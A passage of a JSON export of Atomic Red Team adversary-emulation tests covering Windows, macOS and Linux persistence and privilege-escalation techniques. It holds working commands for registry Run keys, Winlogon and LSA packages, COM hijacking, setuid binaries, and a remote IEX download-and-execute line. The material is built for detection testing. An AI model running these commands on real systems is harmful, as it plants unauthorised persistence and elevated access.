Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | payload | cap.c payload | Path | PathToAtomicsFolder/T1548.001/src/cap.c | "}, "executionSteps": [{"description": "cp #{payload} /tmp/cap.c\nmake /tmp/cap\nsudo setcap cap_setuid=ep /tmp/cap\n/tmp/cap\n", "successCriteria": null}], "techniqueIds": ["clacwm67r036i29mqhgmzc8yn"], "tags": []}, {"data": {"name": "Make and modify binary from C source", "shortName": "T1548.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Make, change owner, and change file attributes on a C source code file\n\n\n**Supported Platforms:** macos, linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | payload | hello.c payload | Path | PathToAtomicsFolder/T1548.001/src/hello.c | "}, "executionSteps": [{"description": "cp #{payload} /tmp/hello.c\nsudo chown root /tmp/hello.c\nsudo make /tmp/hello\nsudo chown root /tmp/hello\nsudo chmod u+s /tmp/hello\n/tmp/hello\n", "successCriteria": null}], "techniqueIds": ["clacwm67r036i29mqhgmzc8yn", "clacwm2f800tt29mqhbgicjua"], "tags": []}, {"data": {"name": "Persistence by modifying Windows Terminal profile", "shortName": "T1547.015", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify Windows Terminal settings.json file to gain persistence. [Twitter Post](https://twitter.com/nas_bench/status/1550836225652686848)\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | calculator | Test program used to imitate a maliciously called program. | String | calculator.exe | \n | settings_json_def | Default file for Windows Terminal to replace the default profile with a backdoor to call another program. | Path | ~\\AppData\\Local\\Packages\\Microsoft.WindowsTerminal_8wekyb3d8bbwe\\LocalState\\settings.json | \n | settings_json_tmp | Temp file for Windows Terminal. | Path | ~\\AppData\\Local\\Temp\\settings.json | \n | wt_exe | Windows Terminal executable. | Path | ~\\AppData\\Local\\Microsoft\\WindowsApps\\Microsoft.WindowsTerminal_8wekyb3d8bbwe\\wt.exe | "}, "executionSteps": [{"description": "mv #{settings_json_def} #{settings_json_tmp}\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.015/src/settings.json?raw=true\" -OutFile \"#{settings_json_def}\"\nwt.exe\n", "successCriteria": null}], "techniqueIds": ["clacwm6d403c829mq5ukr0dhx"], "tags": []}, {"data": {"name": "Plist Modification", "shortName": "T1547.011", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify MacOS plist file in one of two directories\n\n\n**Supported Platforms:** macos\n\n"}, "executionSteps": [{"description": "1. Modify a .plist in\n\n    /Library/Preferences\n\n    OR\n\n    ~/Library/Preferences\n\n2. Subsequently, follow the steps for adding and running via [Launch Agent](Persistence/Launch_Agent.md)\n", "successCriteria": null}], "techniqueIds": ["clacwm29500o629mq5se65smm"], "tags": []}, {"data": {"name": "Add Port Monitor persistence in Registry", "shortName": "T1547.010", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Add key-value pair to a Windows Port Monitor registry. On the subsequent reboot dll will be execute under spoolsv with NT AUTHORITY/SYSTEM privilege.\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | monitor_dll | Addition to port monitor registry key. Normally refers to a DLL name in C:\\Windows\\System32. arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL. | Path | C:\\Path\\AtomicRedTeam.dll | "}, "executionSteps": [{"description": "reg add \"hklm\\system\\currentcontrolset\\control\\print\\monitors\\ART\" /v \"Atomic Red Team\" /d \"#{monitor_dll}\" /t REG_SZ\n", "successCriteria": null}], "techniqueIds": ["clacwm61h030629mq230wf0fd", "clacwm29c00oh29mq2l7lasww"], "tags": []}, {"data": {"name": "Shortcut Modification", "shortName": "T1547.009", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test to simulate shortcut modification and then execute. example shortcut (*.lnk , .url) strings check with powershell;\ngci -path \"C:\\Users\" -recurse -include *.url -ea SilentlyContinue | Select-String -Pattern \"exe\" | FL.\nUpon execution, calc.exe will be launched.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | shortcut_file_path | shortcut modified and execute | Path | %temp%\\T1547.009_modified_shortcut.url | "}, "executionSteps": [{"description": "echo [InternetShortcut] > #{shortcut_file_path}\necho URL=C:\\windows\\system32\\calc.exe >> #{shortcut_file_path}\n#{shortcut_file_path}\n", "successCriteria": null}], "techniqueIds": ["clacwm62d031429mq2luwcxk3", "clacwm2fh00u229mq8in02x0g"], "tags": []}, {"data": {"name": "Create shortcut to cmd in startup folders", "shortName": "T1547.009", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "LNK file to launch CMD placed in startup folder. Upon execution, open File Explorer and browse to \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"\nto view the new shortcut.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$Shell = New-Object -ComObject (\"WScript.Shell\")\n$ShortCut = $Shell.CreateShortcut(\"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1547.009.lnk\")\n$ShortCut.TargetPath=\"cmd.exe\"\n$ShortCut.WorkingDirectory = \"C:\\Windows\\System32\";\n$ShortCut.WindowStyle = 1;\n$ShortCut.Description = \"T1547.009.\";\n$ShortCut.Save()\n\n$Shell = New-Object -ComObject (\"WScript.Shell\")\n$ShortCut = $Shell.CreateShortcut(\"$env:ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1547.009.lnk\")\n$ShortCut.TargetPath=\"cmd.exe\"\n$ShortCut.WorkingDirectory = \"C:\\Windows\\System32\";\n$ShortCut.WindowStyle = 1;\n$ShortCut.Description = \"T1547.009.\";\n$ShortCut.Save()\n", "successCriteria": null}], "techniqueIds": ["clacwm62d031429mq2luwcxk3", "clacwm2fh00u229mq8in02x0g"], "tags": []}, {"data": {"name": "Modify Registry to load Arbitrary DLL into LSASS - LsaDbExtPt", "shortName": "T1547.008", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The following Atomic will modify an undocumented registry key that may be abused to load a arbitrary DLL into LSASS. \n\nUpon execution, the registry key will be modified and a value will contain the path to the DLL. \nReference: https://blog.xpnsec.com/exploring-mimikatz-part-1/ and source https://github.com/oxfemale/LogonCredentialsSteal\nNote that if any LSA based protection is enabled, this will most likely not be successful with LSASS.exe loading the DLL.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | dll_path | Module to be loaded into LSASS | Path | $env:TEMP\\lsass_lib.dll | "}, "executionSteps": [{"description": "New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS -Name LsaDbExtPt -Value \"#{dll_path}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6sv03tz29mqh4os8j9m"], "tags": []}, {"data": {"name": "Re-Opened Applications", "shortName": "T1547.007", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Plist Method\n\n[Reference](https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CustomLogin.html)\n\n\n**Supported Platforms:** macos\n\n"}, "executionSteps": [{"description": "1. create a custom plist:\n\n    ~/Library/Preferences/com.apple.loginwindow.plist\n\nor\n\n    ~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist\n", "successCriteria": null}], "techniqueIds": ["clacwm2b000q529mqa9yce7mc"], "tags": []}, {"data": {"name": "Re-Opened Applications", "shortName": "T1547.007", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Mac Defaults\n\n[Reference](https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CustomLogin.html)\n\n\n**Supported Platforms:** macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | script | path to script | Path | /path/to/script | "}, "executionSteps": [{"description": "sudo defaults write com.apple.loginwindow LoginHook #{script}\n", "successCriteria": null}], "techniqueIds": ["clacwm6r503s529mq6tyn7swo", "clacwm2b000q529mqa9yce7mc"], "tags": []}, {"data": {"name": "Linux - Load Kernel Module via insmod", "shortName": "T1547.006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test uses the insmod command to load a kernel module for Linux.\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | module_name | Name of the kernel module name. | String | T1547006 | \n | module_path | Folder used to store the module. | Path | /tmp/T1547.006/T1547006.ko | \n | temp_folder | Temp folder used to compile the code. | Path | /tmp/T1547.006 | \n | module_source_path | Path to download Gsecdump binary file | Url | PathToAtomicsFolder/T1547.006/src | "}, "executionSteps": [{"description": "sudo insmod #{module_path}\n", "successCriteria": null}], "techniqueIds": ["clacwm6gp03ge29mq83di00e5", "clacwm20a00hr29mq0wdg6lci"], "tags": []}, {"data": {"name": "Modify SSP configuration in registry", "shortName": "T1547.005", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Add a value to a Windows registry SSP key, simulating an adversarial modification of those keys.\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | fake_ssp_dll | Value added to registry key. Normally refers to a DLL name in C:\\Windows\\System32. | String | not-a-ssp | "}, "executionSteps": [{"description": "# run these in sequence\n$SecurityPackages = Get-ItemProperty HKLM:\\System\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages'\n$SecurityPackagesUpdated = $SecurityPackages\n$SecurityPackagesUpdated += \"#{fake_ssp_dll}\"\nSet-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' -Value $SecurityPackagesUpdated\n\n# revert (before reboot)\nSet-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' -Value $SecurityPackages\n", "successCriteria": null}], "techniqueIds": ["clacwm63i032529mqelh62py7", "clacwm2el00t429mq8ftn8nw9"], "tags": []}, {"data": {"name": "Winlogon Userinit Key Persistence - PowerShell", "shortName": "T1547.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | binary_to_execute | Path of binary to execute | Path | C:\\Windows\\System32\\cmd.exe | "}, "executionSteps": [{"description": "Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, #{binary_to_execute}\" -Force\n", "successCriteria": null}], "techniqueIds": ["clacwm67u036l29mq0sxi6212", "clacwm2mm010m29mq84yg8nno"], "tags": []}, {"data": {"name": "Winlogon Shell Key Persistence - PowerShell", "shortName": "T1547.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "PowerShell code to set Winlogon shell key to execute a binary at logon along with explorer.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | binary_to_execute | Path of binary to execute | Path | C:\\Windows\\System32\\cmd.exe | "}, "executionSteps": [{"description": "Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Shell\" \"explorer.exe, #{binary_to_execute}\" -Force\n", "successCriteria": null}], "techniqueIds": ["clacwm67u036l29mq0sxi6212", "clacwm2mm010m29mq84yg8nno"], "tags": []}, {"data": {"name": "Winlogon Notify Key Logon Persistence - PowerShell", "shortName": "T1547.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "PowerShell code to set Winlogon Notify key to execute a notification package DLL at logon.\n\nUpon successful execution, PowerShell will modify a registry value to execute atomicNotificationPackage.dll upon logon/logoff.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | binary_to_execute | Path of notification package to execute | Path | C:\\Windows\\Temp\\atomicNotificationPackage.dll | "}, "executionSteps": [{"description": "New-Item \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\" -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\" \"logon\" \"#{binary_to_execute}\" -Force\n", "successCriteria": null}], "techniqueIds": ["clacwm67u036l29mq0sxi6212", "clacwm2mm010m29mq84yg8nno"], "tags": []}, {"data": {"name": "Edit an existing time provider", "shortName": "T1547.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Establishes persistence by editing the NtpServer time provider registry key under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProvider.\nThe time provider will point to a DLL which will be loaded after the w32time service is started. The DLL will then create the file AtomicTest.txt\nin C:\\Users\\Public\\ as validation that the test is successful.\n\nPayload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.003/\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "net stop w32time\nCopy-Item $PathToAtomicsFolder\\T1547.003\\bin\\AtomicTest.dll C:\\Users\\Public\\AtomicTest.dll\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_SZ /v \"DllName\" /d \"C:\\Users\\Public\\AtomicTest.dll\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"Enabled\" /d \"1\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"InputProvider\" /d \"1\" /f\nnet start w32time\n", "successCriteria": null}], "techniqueIds": ["clacwm66j035129mq7wx19hgf"], "tags": []}, {"data": {"name": "Create a new time provider", "shortName": "T1547.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Establishes persistence by creating a new time provider registry key under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProvider.\nThe new time provider will point to a DLL which will be loaded after the w32time service is started. The DLL will then create the file AtomicTest.txt\nin C:\\Users\\Public\\ as validation that the test is successful.\n\nPayload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.003/\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "net stop w32time\nCopy-Item $PathToAtomicsFolder\\T1547.003\\bin\\AtomicTest.dll C:\\Users\\Public\\AtomicTest.dll\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_SZ /v \"DllName\" /d \"C:\\Users\\Public\\AtomicTest.dll\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_DWORD /v \"Enabled\" /d \"1\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_DWORD /v \"InputProvider\" /d \"1\" /f\nnet start w32time\n", "successCriteria": null}], "techniqueIds": ["clacwm66j035129mq7wx19hgf"], "tags": []}, {"data": {"name": "Authentication Package", "shortName": "T1547.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Establishes persistence using a custom authentication package for the Local Security Authority (LSA).\nAfter a reboot, Notepad.exe will be executed as child process of lsass.exe.\nPayload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.002/package\n[Related blog](https://pentestlab.blog/2019/10/21/persistence-security-support-provider/)\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Copy-Item $PathToAtomicsFolder\\T1547.002\\bin\\package.dll C:\\Windows\\System32\\\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"Authentication Packages\" /t REG_MULTI_SZ /d \"msv1_0\\0package.dll\" /f\n", "successCriteria": null}], "techniqueIds": ["clacwm6k003k329mqdu1p675t"], "tags": []}, {"data": {"name": "SystemBC Malware-as-a-Service Registry", "shortName": "T1547.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This Atomic will create a registry key called socks5_powershell for persistance access\nhttps://medium.com/walmartglobaltech/systembc-powershell-version-68c9aad0f85c\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | reg_key_value | Thing to Run | Path | powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File | \n | reg_key_path | Path to registry key to update | Path | HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run | "}, "executionSteps": [{"description": "$RunKey = \"#{reg_key_path}\"\nSet-ItemProperty -Path $RunKey -Name \"socks5_powershell\" -Value \"#{reg_key_value}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6g603fu29mqgz3ve8t2"], "tags": []}, {"data": {"name": "Suspicious vbs file run from startup Folder", "shortName": "T1547.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "vbs files can be placed in and ran from the startup folder to maintain persistance. Upon execution, \"T1547.001 Hello, World VBS!\" will be displayed twice. \nAdditionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Copy-Item $PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"\nCopy-Item $PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"\ncscript.exe \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"\ncscript.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6g603fu29mqgz3ve8t2", "clacwm2ba00qf29mqcu1k7rel"], "tags": []}, {"data": {"name": "Suspicious jse file run from startup Folder", "shortName": "T1547.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "jse files can be placed in and ran from the startup folder to maintain persistance.\nUpon execution, \"T1547.001 Hello, World JSE!\" will be displayed twice. \nAdditionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Copy-Item $PathToAtomicsFolder\\T1547.001\\src\\jsestartup.jse \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"\nCopy-Item $PathToAtomicsFolder\\T1547.001\\src\\jsestartup.jse \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"\ncscript.exe /E:Jscript \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"\ncscript.exe /E:Jscript \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6g603fu29mqgz3ve8t2", "clacwm2ba00qf29mqcu1k7rel"], "tags": []}, {"data": {"name": "Suspicious bat file run from startup Folder", "shortName": "T1547.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "bat files can be placed in and executed from the startup folder to maintain persistance.\nUpon execution, cmd will be run and immediately closed. Additionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Copy-Item $PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"\nCopy-Item $PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"\nStart-Process \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"\nStart-Process \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6g603fu29mqgz3ve8t2", "clacwm2ba00qf29mqcu1k7rel"], "tags": []}, {"data": {"name": "Reg Key RunOnce", "shortName": "T1547.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "RunOnce Key Persistence.\n\nUpon successful execution, cmd.exe will modify the registry to load AtomicRedTeam.dll to RunOnceEx. Output will be via stdout. \n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | thing_to_execute | Thing to Run | Path | C:\\Path\\AtomicRedTeam.dll | "}, "executionSteps": [{"description": "REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"#{thing_to_execute}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6g603fu29mqgz3ve8t2", "clacwm2ba00qf29mqcu1k7rel"], "tags": []}, {"data": {"name": "Reg Key Run", "shortName": "T1547.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Run Key Persistence\n\nUpon successful execution, cmd.exe will modify the registry by adding \\\"Atomic Red Team\\\" to the Run key. Output will be via stdout. \n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | command_to_execute | Thing to Run | Path | C:\\Path\\AtomicRedTeam.exe | "}, "executionSteps": [{"description": "REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /t REG_SZ /F /D \"#{command_to_execute}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6g603fu29mqgz3ve8t2", "clacwm2ba00qf29mqcu1k7rel"], "tags": []}, {"data": {"name": "PowerShell Registry RunOnce", "shortName": "T1547.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "RunOnce Key Persistence via PowerShell\nUpon successful execution, a new entry will be added to the runonce item in the registry.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | thing_to_execute | Thing to Run | Path | powershell.exe | \n | reg_key_path | Path to registry key to update | Path | HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce | "}, "executionSteps": [{"description": "$RunOnceKey = \"#{reg_key_path}\"\nset-itemproperty $RunOnceKey \"NextRun\" '#{thing_to_execute} \"IEX (New-Object Net.WebClient).DownloadString(`\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/36f83b728bc26a49eacb0535edc42be8c377ac54/ARTifacts/Misc/Discovery.bat`\")\"'\n", "successCriteria": null}], "techniqueIds": ["clacwm6g603fu29mqgz3ve8t2", "clacwm2ba00qf29mqcu1k7rel"], "tags": []}, {"data": {"name": "Add persistance via Recycle bin", "shortName": "T1547.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Add a persistance via Recycle bin [vxunderground](https://github.com/vxunderground/VXUG-Papers/blob/main/The%20Persistence%20Series/Persistence%20via%20Recycle%20Bin/Persistence_via_Recycle_Bin.pdf)\nUser have to clic on the recycle bin to lauch the payload (here calc)\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg ADD \"HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command\" /ve /d \"calc.exe\" /f", "successCriteria": null}], "techniqueIds": ["clacwm6g603fu29mqgz3ve8t2"], "tags": []}, {"data": {"name": "Add Executable Shortcut Link to User Startup Folder", "shortName": "T1547.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Adds a non-malicious executable shortcut link to the current users startup directory. Test can be verified by going to the users startup directory and checking if the shortcut link exists. \n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$Target = \"C:\\Windows\\System32\\calc.exe\"\n$ShortcutLocation = \"$home\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\calc_exe.lnk\"\n$WScriptShell = New-Object -ComObject WScript.Shell\n$Create = $WScriptShell.CreateShortcut($ShortcutLocation)\n$Create.TargetPath = $Target\n$Create.Save()      ", "successCriteria": null}], "techniqueIds": ["clacwm6g603fu29mqgz3ve8t2", "clacwm2ba00qf29mqcu1k7rel"], "tags": []}, {"data": {"name": "Add a driver", "shortName": "T1547", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Install a driver via pnputil.exe lolbin\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | driver_inf | A built-in, already installed windows driver inf | Path | C:\\Windows\\INF\\usbstor.inf | "}, "executionSteps": [{"description": "pnputil.exe /add-driver \"#{driver_inf}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5u902t329mqfpjw3oho"], "tags": []}, {"data": {"name": "Powershell Execute COM Object", "shortName": "T1546.015", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Use the PowerShell to execute COM CLSID object.\nReference: https://pentestlab.blog/2020/05/20/persistence-com-hijacking/\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$o= [activator]::CreateInstance([type]::GetTypeFromCLSID(\"9BA05972-F6A8-11CF-A442-00A0C90A8F39\"))\n$item = $o.Item()\n$item.Document.Application.ShellExecute(\"cmd.exe\",\"/c calc.exe\",\"C:\\windows\\system32\",$null,0)\n", "successCriteria": null}], "techniqueIds": ["clacwm6kn03kn29mqejzz1qby"], "tags": []}, {"data": {"name": "COM Hijacking with RunDLL32 (Local Server Switch)", "shortName": "T1546.015", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via \"rundll32.exe -localserver [clsid]\". \nThis method is generally used as an alternative to 'rundll32.exe -sta [clsid]' to execute dll's while evading detection. \nReference: https://www.hexacorn.com/blog/2020/02/13/run-lola-bin-run/\nUpon successful execution of this test with the default options, whenever certain apps are opened (for example, Notepad), a calculator window will also be opened. \n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | clsid_threading | Threading Model | string | Both | \n | dll_path | Path to the DLL. | String | $env:temp\\T1546.015_calc.dll | \n | clsid | Class ID to hijack. | string | {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7} | \n | clsid_description | Description for CLSID | string | MSAA AccPropServices | "}, "executionSteps": [{"description": "New-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}' -Value '#{clsid_description}'\nNew-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}\\InprocServer32' -Value #{dll_path}\nNew-ItemProperty -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}\\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType \"String\"\nStart-Process -FilePath \"C:\\Windows\\System32\\RUNDLL32.EXE\" -ArgumentList '-localserver #{clsid}'", "successCriteria": null}], "techniqueIds": ["clacwm6kn03kn29mqejzz1qby"], "tags": []}, {"data": {"name": "COM hijacking via TreatAs", "shortName": "T1546.015", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test first create a custom CLSID class pointing to the Windows Script Component runtime DLL. This DLL looks for the ScriptletURL key to get the location of the script to execute.\nThen, it hijacks the CLSID for the Work Folders Logon Synchronization to establish persistence on user logon by creating the 'TreatAs' with the malicious CLSID as default value. The\ntest is validated by running 'rundll32.exe -sta \"AtomicTest\"' to avoid logging out.\n\nReferences:\n\nhttps://youtu.be/3gz1QmiMhss?t=1251\n\nhttps://github.com/enigma0x3/windows-operating-system-archaeology\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest\" /ve /T REG_SZ /d \"AtomicTest\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest.1.00\" /ve /T REG_SZ /d \"AtomicTest\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest\\CLSID\" /ve /T REG_SZ /d \"{00000001-0000-0000-0000-0000FEEDACDC}\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest.1.00\\CLSID\" /ve /T REG_SZ /d \"{00000001-0000-0000-0000-0000FEEDACDC}\" /f\nreg add 